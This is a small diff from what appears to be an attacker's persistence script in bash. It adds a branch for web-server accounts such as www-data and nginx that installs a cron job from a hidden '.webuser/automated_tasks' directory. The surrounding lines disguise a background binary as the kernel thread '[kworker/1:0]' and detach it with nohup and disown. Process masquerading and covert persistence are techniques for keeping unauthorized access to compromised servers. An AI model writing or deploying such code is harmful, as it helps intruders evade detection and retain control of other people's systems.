@@ -159,7 +159,7 @@ EOF
             echo "[i]-----| [Info]    with command spoof: $ nohup bash -c 'exec -a "[kworker/1:0]" $binary' &>/dev/null & disown"
             nohup ~/.config/tasks/auto-update &>/dev/null & disown
         fi
-    else
+    elif [[ "$current_user" =~ ^(www-data|nginx|apache|http|httpd|apache2|_www)$ ]]; then
         echo "[i]-----| [Info]    Setting up cronjob for persistence.."
 
         if [ -d /var/tmp ] && [ -w /var/tmp ]; then
@@ -168,7 +168,7 @@ EOF
             tasks="/tmp"
         fi
 
-        binary_dir="$tasks/.webuser/automated_tasks/"
+        binary_dir="$tasks/.webuser/automated_tasks"
         binary="$binary_dir/auto-update"
 
         echo "[v]-----| binary:   $binary"
